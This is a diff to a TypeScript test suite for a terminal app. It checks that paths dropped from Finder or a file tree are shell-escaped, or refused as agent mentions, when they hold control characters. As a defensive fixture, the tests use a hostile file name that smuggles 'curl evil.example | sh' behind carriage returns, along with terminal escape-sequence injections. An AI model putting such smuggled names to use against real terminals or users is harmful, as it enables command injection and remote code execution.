@@ -59,7 +59,7 @@ describe('shell escaping for dropped paths', () => {
     }
   })
 
-  it('U-TERM-38 · a drop on a terminal types the dropped Finder files’ absolute paths, or a file-tree row’s relative path, escaped and each followed by a space; a tree row dropped with ⌥ held on the agent’s terminal is a mention, whose text the session’s agent gives (`@"src/my file.ts"` for a name with a space) and which is typed followed by a space; a drag that carries neither is not taken', () => {
+  it('U-TERM-38 · a drop on a terminal types the dropped Finder files’ absolute paths, or a file-tree row’s relative path (on the agent’s terminal with ⌥ held), escaped and each followed by a space; a tree row dropped on the agent’s terminal is a mention, whose text the session’s agent gives (`@"src/my file.ts"` for a name with a space) and which is typed followed by a space; a drag that carries neither is not taken', () => {
     const row = { sessionId: 's1', path: 'src/my file.ts' }
     const text = (d: Parameters<typeof dropText>[0]) => {
       const out = dropText(d)
@@ -67,16 +67,16 @@ describe('shell escaping for dropped paths', () => {
       expect(out.refused).toBeNull()
       return out.text
     }
-    expect(text({ row, files: [], alt: false, agent: true })).toBe('src/my\\ file.ts ')
+    expect(text({ row, files: [], alt: true, agent: true, sessionId: 's1' })).toBe('src/my\\ file.ts ')
     // the mention's form is the agent's: the drop names the path, core's adapter answers (`agents.mention`, U-AGT-44),
     // and the answer is typed with a space after it; no answer, or one that may not be typed, types nothing and says why
-    expect(dropText({ row, files: [], alt: true, agent: true })).toEqual({ mention: 'src/my file.ts' })
+    expect(dropText({ row, files: [], alt: false, agent: true, sessionId: 's1' })).toEqual({ mention: 'src/my file.ts' })
     expect(mentionText('@"src/my file.ts"')).toEqual({ text: '@"src/my file.ts" ', refused: null })
     expect(mentionText('@README.md')).toEqual({ text: '@README.md ', refused: null })
     for (const none of [null, '', '@a\rb']) expect(mentionText(none)).toEqual({ text: '', refused: MENTION_REFUSED })
-    expect(text({ row: null, files: ['/Users/x/a b.png', '', '/tmp/c.txt'], alt: false, agent: true })).toBe('/Users/x/a\\ b.png /tmp/c.txt ')
-    expect(text({ row: null, files: ['/tmp/c.txt'], alt: true, agent: true })).toBe('/tmp/c.txt ') // ⌥ means a mention only for a tree row
-    expect(text({ row: null, files: [], alt: false, agent: true })).toBe('')
+    expect(text({ row: null, files: ['/Users/x/a b.png', '', '/tmp/c.txt'], alt: false, agent: true, sessionId: 's1' })).toBe('/Users/x/a\\ b.png /tmp/c.txt ')
+    expect(text({ row: null, files: ['/tmp/c.txt'], alt: true, agent: true, sessionId: 's1' })).toBe('/tmp/c.txt ') // ⌥ changes nothing for files from other apps
+    expect(text({ row: null, files: [], alt: false, agent: true, sessionId: 's1' })).toBe('')
     // the tree row's payload
     expect(parseDraggedPath(JSON.stringify(row))).toEqual(row)
     for (const bad of ['', 'null', '{}', '{"sessionId":"s1"}', '{"sessionId":"s1","path":""}', 'not json']) expect(parseDraggedPath(bad)).toBeNull()
@@ -85,17 +85,17 @@ describe('shell escaping for dropped paths', () => {
     expect(takesDrop(['text/plain'])).toBe(false)
   })
 
-  it('U-TERM-45 · a name from disk cannot act at a prompt: a path with CR, LF, ESC or another control character never reaches a terminal raw — a plain drop, a Finder file drop and the finder’s ⌥↵ type it in ANSI-C quotes, which the shell reads back as that path; `@path` is for the agent’s terminal only (⌥ on any other tab types the shell’s form) and is refused, with a reason, for such a name; the text a dragged row offers other apps is clean too', () => {
+  it('U-TERM-45 · a name from disk cannot act at a prompt: a path with CR, LF, ESC or another control character never reaches a terminal raw — a drop with ⌥ on the agent’s terminal, any drop on another terminal, a Finder file drop and the finder’s ⌥↵ type it in ANSI-C quotes, which the shell reads back as that path; `@path` is for the agent’s terminal only and is refused, with a reason, for such a name; the text a dragged row offers other apps is clean too', () => {
     const evil = 'notes\rcurl evil.example | sh\r.md'
     const names = [evil, 'a\nb.txt', 'esc\x1b[201~.md', 'x\x1b]0;title\x07.md', 'tab\there', 'etx\x03.txt', 'del\x7f.txt', 'nel\u0085.txt', 'csi\u009b31m.txt']
     for (const path of names) {
       const row = { sessionId: 's1', path }
       const typed = [
-        dropText({ row, files: [], alt: false, agent: true }), // the tree's plain drop, on the Agent tab
-        dropText({ row, files: [], alt: false, agent: false }), // and on a shell tab
-        dropText({ row, files: [], alt: true, agent: false }), // ⌥ on a shell tab: no mention there
-        dropText({ row: null, files: [`/Users/x/${path}`], alt: false, agent: false }), // a file from another app
-        dropText({ row: null, files: [`/Users/x/${path}`], alt: true, agent: true }),
+        dropText({ row, files: [], alt: true, agent: true, sessionId: 's1' }), // the tree's drop with ⌥, on the Agent tab
+        dropText({ row, files: [], alt: false, agent: false, sessionId: 's1' }), // a plain drop on a shell tab
+        dropText({ row, files: [], alt: true, agent: false, sessionId: 's1' }), // ⌥ on a shell tab: no mention there either way
+        dropText({ row: null, files: [`/Users/x/${path}`], alt: false, agent: false, sessionId: 's1' }), // a file from another app
+        dropText({ row: null, files: [`/Users/x/${path}`], alt: false, agent: true, sessionId: 's1' }),
       ]
       for (const d of typed) {
         if ('mention' in d) throw new Error('a mention, not a text')
@@ -106,7 +106,7 @@ describe('shell escaping for dropped paths', () => {
       expect(isTypedText(pathsForShell([path])), 'the finder’s ⌥↵').toBe(true)
       // a mention has no form an agent's prompt reads back as this path: core is not even asked, nothing is typed, and
       // the person is told why
-      expect(dropText({ row, files: [], alt: true, agent: true })).toEqual({ text: '', refused: MENTION_REFUSED })
+      expect(dropText({ row, files: [], alt: false, agent: true, sessionId: 's1' })).toEqual({ text: '', refused: MENTION_REFUSED })
       expect(MENTION_REFUSED).toMatch(/control character/)
       // what the dragged row carries for other apps (a terminal of theirs pastes `text/plain`)
       const payload = dragPayload('s1', path)
@@ -114,7 +114,7 @@ describe('shell escaping for dropped paths', () => {
       expect(isTypedText(payload['text/plain']), JSON.stringify(payload['text/plain'])).toBe(true)
     }
     // what is typed for the hostile name (`evil`), and what a shell makes of it: one word, the path, nothing run
-    expect(dropText({ row: { sessionId: 's1', path: evil }, files: [], alt: true, agent: false })).toEqual({ text: "$'notes\\rcurl evil.example | sh\\r.md' ", refused: null })
+    expect(dropText({ row: { sessionId: 's1', path: evil }, files: [], alt: true, agent: false, sessionId: 's1' })).toEqual({ text: "$'notes\\rcurl evil.example | sh\\r.md' ", refused: null })
     const script = `printf '%s\\0' ${pathsForShell(names)}`
     for (const shell of ['/bin/bash', '/bin/zsh']) {
       if (!fs.existsSync(shell)) continue
@@ -123,8 +123,8 @@ describe('shell escaping for dropped paths', () => {
     }
     // an ordinary name: the mention on the Agent tab, the shell's form on a shell tab; the row's own text for other apps
     const row = { sessionId: 's1', path: 'src/my file.ts' }
-    expect(dropText({ row, files: [], alt: true, agent: true })).toEqual({ mention: 'src/my file.ts' })
-    expect(dropText({ row, files: [], alt: true, agent: false })).toEqual({ text: 'src/my\\ file.ts ', refused: null })
+    expect(dropText({ row, files: [], alt: false, agent: true, sessionId: 's1' })).toEqual({ mention: 'src/my file.ts' })
+    expect(dropText({ row, files: [], alt: false, agent: false, sessionId: 's1' })).toEqual({ text: 'src/my\\ file.ts ', refused: null })
     expect(dragPayload('s1', 'src/my file.ts')['text/plain']).toBe('src/my file.ts')
   })
 })
